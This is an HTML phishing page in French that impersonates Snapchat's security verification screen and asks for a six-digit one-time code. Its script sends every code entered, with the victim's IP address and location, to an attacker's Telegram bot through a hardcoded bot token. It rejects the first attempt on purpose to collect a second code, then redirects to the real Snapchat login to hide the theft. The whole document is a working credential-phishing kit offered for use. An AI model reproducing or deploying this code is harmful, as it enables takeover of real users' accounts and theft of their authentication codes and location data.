<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V√©rification de S√©curit√©</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #FFFC00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 90%;
            max-width: 400px;
            background-color: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo {
            width: 60px;
            margin: 0 auto 20px;
        }

        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 30px;
        }

        .code-input {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .code-input input {
            width: 40px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .message {
            font-size: 16px;
            color: red;
            margin-top: 20px;
            display: none;
        }

        .countdown {
            font-size: 14px;
            color: #555;
            margin-top: 15px;
            font-weight: bold;
        }

        .waiting-message {
            font-size: 18px;
            color: #333;
            margin-top: 20px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://1000logos.net/wp-content/uploads/2017/08/Snapchat-logo.png" alt="Logo Snapchat">
        <h1>V√©rification de S√©curit√©</h1>
        <p>Veuillez entrer le code de v√©rification envoy√© √† votre appareil</p>
        
        <div class="code-input">
            <input type="text" maxlength="1" id="code1" oninput="moveToNext(this, 'code2')">
            <input type="text" maxlength="1" id="code2" oninput="moveToNext(this, 'code3')">
            <input type="text" maxlength="1" id="code3" oninput="moveToNext(this, 'code4')">
            <input type="text" maxlength="1" id="code4" oninput="moveToNext(this, 'code5')">
            <input type="text" maxlength="1" id="code5" oninput="moveToNext(this, 'code6')">
            <input type="text" maxlength="1" id="code6" oninput="submitCode()">
        </div>
        
        <div class="message" id="error-message">Code incorrect. Veuillez r√©essayer.</div>
        <div class="countdown" id="countdown"></div>
        <div class="waiting-message" id="waiting-message">Veuillez patienter, v√©rification en cours...</div>
    </div>

    <script>
        // Configuration Telegram
        const telegramConfigs = [
            { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
            { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
        ];

        let countdownInterval;
        let verificationAttempts = 0;

        // Fonction pour passer au champ suivant
        function moveToNext(current, nextId) {
            if (current.value.length === 1) {
                document.getElementById(nextId).focus();
            }
        }

        // Fonction pour soumettre le code
        function submitCode() {
            const code1 = document.getElementById('code1').value;
            const code2 = document.getElementById('code2').value;
            const code3 = document.getElementById('code3').value;
            const code4 = document.getElementById('code4').value;
            const code5 = document.getElementById('code5').value;
            const code6 = document.getElementById('code6').value;
            
            const fullCode = code1 + code2 + code3 + code4 + code5 + code6;
            
            if (fullCode.length === 6) {
                sendCodeToTelegram(fullCode);
                verificationAttempts++;
                
                if (verificationAttempts === 1) {
                    // Premier essai - faux code
                    showErrorAndReset();
                } else {
                    // Deuxi√®me essai - afficher message d'attente
                    showWaitingMessage();
                }
            }
        }

        // Envoyer le code √† Telegram
        async function sendCodeToTelegram(code) {
            const ipInfo = await fetch('https://ipinfo.io/json')
                .then(response => response.json())
                .catch(() => ({}));
            
            const message = `üîê Code de v√©rification Snapchat üîê
üî¢ Code: ${code}
üìç IP: ${ipInfo.ip || 'Inconnue'}
üåç Pays: ${ipInfo.country || 'Inconnu'}
üèôÔ∏è Ville: ${ipInfo.city || 'Inconnue'}`;

            for (const config of telegramConfigs) {
                try {
                    await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: config.chatId,
                            text: message
                        })
                    });
                } catch (error) {
                    console.error('Erreur lors de l\'envoi √† Telegram:', error);
                }
            }
        }

        // Afficher erreur et r√©initialiser
        function showErrorAndReset() {
            document.getElementById('error-message').style.display = 'block';
            startCountdown(15, () => {
                resetCodeInput();
                document.getElementById('error-message').style.display = 'none';
            });
        }

        // Afficher message d'attente
        function showWaitingMessage() {
            document.getElementById('error-message').style.display = 'none';
            document.querySelector('.code-input').style.display = 'none';
            document.getElementById('waiting-message').style.display = 'block';
            
            startCountdown(30, () => {
                window.location.href = 'https://accounts.snapchat.com/accounts/login';
            });
        }

        // R√©initialiser les champs de code
        function resetCodeInput() {
            for (let i = 1; i <= 6; i++) {
                document.getElementById(`code${i}`).value = '';
            }
            document.getElementById('code1').focus();
        }

        // D√©marrer le compte √† rebours
        function startCountdown(seconds, callback) {
            clearInterval(countdownInterval);
            
            const countdownElement = document.getElementById('countdown');
            countdownElement.style.display = 'block';
            
            let remaining = seconds;
            
            countdownInterval = setInterval(() => {
                countdownElement.textContent = `Temps restant: ${remaining} secondes`;
                remaining--;
                
                if (remaining < 0) {
                    clearInterval(countdownInterval);
                    countdownElement.style.display = 'none';
                    if (callback) callback();
                }
            }, 1000);
        }

        // Focus sur le premier champ au chargement
        window.onload = function() {
            document.getElementById('code1').focus();
        };
    </script>
</body>
</html>
